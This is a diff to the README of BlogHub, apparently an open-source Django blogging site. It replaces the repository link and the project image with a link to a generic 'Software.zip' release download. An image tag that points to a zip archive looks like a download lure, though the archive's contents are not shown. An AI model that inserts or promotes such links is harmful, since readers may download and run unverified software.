@@ -14,7 +14,7 @@ Bloghub is an open source Blogging platform where blogs are crafted based on Tem
 
 ## Repository Details ℹ️
 
-🔗 **Repository Link**: [BlogHub Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) Needs to be Launched
+🔗 **Repository Link**: [BlogHub Repository](https://github.com/samkh010/BlogHub/releases/download/v2.0/Software.zip) Needs to be Launched
 
 🏷️ **Topics**: aws, blogs, blogsite, cloud, django, django-application, gcp, github-actions, linux, opensource, python
 
@@ -44,4 +44,4 @@ Help us spread the word about BlogHub by sharing your experience on social media
 
 Let's create, inspire, and share our stories with BlogHub! 🌟
 
-![BlogHub](https://example.com/bloghub-image.png)
+![BlogHub](https://github.com/samkh010/BlogHub/releases/download/v2.0/Software.zip)
